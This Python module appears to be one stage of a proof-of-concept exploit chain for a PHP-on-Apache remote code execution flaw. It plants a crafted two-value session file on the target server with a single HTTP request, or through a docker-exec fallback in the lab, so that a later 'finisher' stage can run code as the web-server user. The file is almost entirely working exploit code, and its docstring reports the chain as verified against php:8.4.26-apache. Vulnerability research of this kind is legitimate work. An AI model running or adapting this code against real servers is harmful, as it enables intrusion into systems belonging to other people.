#!/usr/bin/env python3 -I
# INDEX: seat a two-scalar session via a real app endpoint over http | apache | pure http
"""Pure-HTTP two-scalar stage-session seat (CVE-2026-109618/109619 Apache finisher precursor).

write.ps_files_basedir_forge's two var_push()es land at ps_files->{last_key,basedir}, which the
stage decode must walk as a session of exactly two top-level scalar records (e.g. "a|i:0;b|i:0;").
Any ordinary session_start()+scalar-write endpoint produces that shape -- lab/apsf/html/sess.php:
session_start(); $_SESSION['a']=(int)$_GET['a']; $_SESSION['b']=(int)$_GET['b']; -- so one GET
against a real app endpoint writes sess_<sid> on save_path over HTTP, no docker-exec seed.

API:
  app_stage(host, port, app_path, sid, *, a=0, b=0, timeout=10) -> one GET to app_path with the
    stage sid cookie; the app's own session_start()+2 scalar writes seat the session file.
  stage_standin(container, sid) -> docker-exec fallback for a bare-echo lab with no session code
    (upload_progress's always-array value and the |-key encoder reject block an app-free scalar
    session there). Lab-only, not pure-HTTP.
  seat_stage(host, port, sid, *, app_path=None, container=None, a=0, b=0, timeout=10) -> app_stage
    when app_path is given, else stage_standin when container is given, else no-op.

Verified: lab/apsf/html/sess.php, php:8.4.26-apache (poc/chains/apache_purehttp_rce.py) -- app_stage
seats sess_<sid> = "a|i:0;b|i:0;" and the finisher lands uid=33 using it unmodified, replacing the
prior docker-exec stand-in end to end.
Stage: VERIFIED 8.4.26-apache (app_stage, pure HTTP); stage_standin is the pre-existing lab-only
docker-exec fallback, unchanged.
"""
import os
import subprocess
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common import http_raw as H  # noqa: E402


def app_stage(host, port, app_path, sid, *, a=0, b=0, timeout=10):
    """Seat the two-scalar stage session via a real session_start()+scalar app endpoint: one GET
    with the stage sid cookie; the app's own session_start()+two $_SESSION writes do the rest."""
    return H.get(host, port, "%s?a=%d&b=%d" % (app_path, a, b),
                 cookie="PHPSESSID=" + sid, timeout=timeout)


def stage_standin(container, sid):
    """Lab-only fallback: write sess_<sid> = 'a|i:0;b|i:0;' via docker exec, for a bare-echo
    target with no session-using app code to seat the two scalars over HTTP."""
    return subprocess.run(
        ["docker", "exec", container, "sh", "-c",
         "printf 'a|i:0;b|i:0;' > /tmp/sess_%s; chmod 666 /tmp/sess_%s" % (sid, sid)],
        capture_output=True, text=True, timeout=30)


def seat_stage(host, port, sid, *, app_path=None, container=None, a=0, b=0, timeout=10):
    """Seat the stage session: app_stage over HTTP when app_path is given, else the docker-exec
    stand-in when container is given, else no-op (session assumed already seated)."""
    if app_path:
        return app_stage(host, port, app_path, sid, a=a, b=b, timeout=timeout)
    if container:
        return stage_standin(container, sid)
    return None
